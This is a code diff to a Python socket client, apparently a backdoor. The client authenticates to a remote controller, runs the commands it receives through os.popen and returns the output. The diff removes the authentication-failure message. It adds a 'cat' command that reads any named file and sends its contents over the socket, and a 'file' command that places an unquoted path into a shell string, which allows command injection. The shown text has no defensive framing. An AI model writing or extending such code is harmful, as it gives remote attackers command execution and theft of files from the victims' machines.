@@ -15,7 +15,6 @@ def cli():
         s_client.sendall(random_key.encode())  
         auth_response = s_client.recv(1024).decode()
         if auth_response != 'Authentication successful':
-            print(f'Authentication failed. Exiting...')
             s_client.close()
             return
 
@@ -29,7 +28,26 @@ def cli():
                     shell = os.popen(cmd).read()
                     s_client.sendall(shell.encode())
                 except Exception as e:
-                    s_client.sendall(str(e).encode()) 
+                    s_client.sendall(str(e).encode())
+            elif cmd.lower().startswith('cat '):
+                try:
+                    file_path = cmd[4:]  
+                    with open(file_path, 'r') as file:
+                        file_contents = file.read()
+                    s_client.sendall(file_contents.encode())
+                except FileNotFoundError:
+                    s_client.sendall("File not found".encode())
+                except Exception as e:
+                    s_client.sendall(str(e).encode())
+            elif cmd.lower().startswith('file '):
+                try:
+                    file_path = cmd[5:]
+                    file_info = os.popen(f'file {file_path}').read()
+                    s_client.sendall(file_info.encode())
+                except FileNotFoundError:
+                    s_client.sendall("File not found".encode())
+                except Exception as e:
+                    s_client.sendall(str(e).encode())
             else:
                 s_client.sendall("Invalid command".encode())
     except Exception as e:
